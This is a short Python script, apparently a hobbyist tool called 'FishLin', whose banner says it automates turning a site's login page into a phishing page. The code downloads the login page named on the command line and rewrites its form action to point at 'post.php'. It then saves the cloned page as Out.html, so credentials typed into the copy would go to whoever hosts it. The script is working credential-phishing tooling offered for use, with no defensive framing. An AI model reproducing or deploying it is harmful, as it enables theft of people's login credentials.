from bs4 import BeautifulSoup 
import requests
import sys , os
banner = """\033[1;33mR007P1n1x's\033[0;m
   ___ _     _       __ _       
  / __(_)___| |__   / /(_)_ __  
 / _\ | / __| '_ \ / / | | '_ \ 
/ /   | \__ \ | | / /__| | | | |
\/    |_|___/_| |_\____/_|_| |_|\033[0;m\n
\033[1;41m[Author Abu Huraira]\033[0;m\n\nFishLin for those people who love automation , really menually if we want to make any page phish , For someperson's it's too much irritateable.\n"""
print (banner)
try:
  requested_site = requests.get(sys.argv[1])
  soup = BeautifulSoup(requested_site.text, "html5lib")
  print("\033[1;41m#Site\033[0;m "+sys.argv[1])
  action = soup.form['action']
  if "action=\"" in requested_site.text:
    form_replace = requested_site.text.replace(action   ,"post.php")
    output = open("Out.html" , "w")
    output.write(form_replace)
except:
  print("Useage : python "+sys.argv[0]+" login page\n")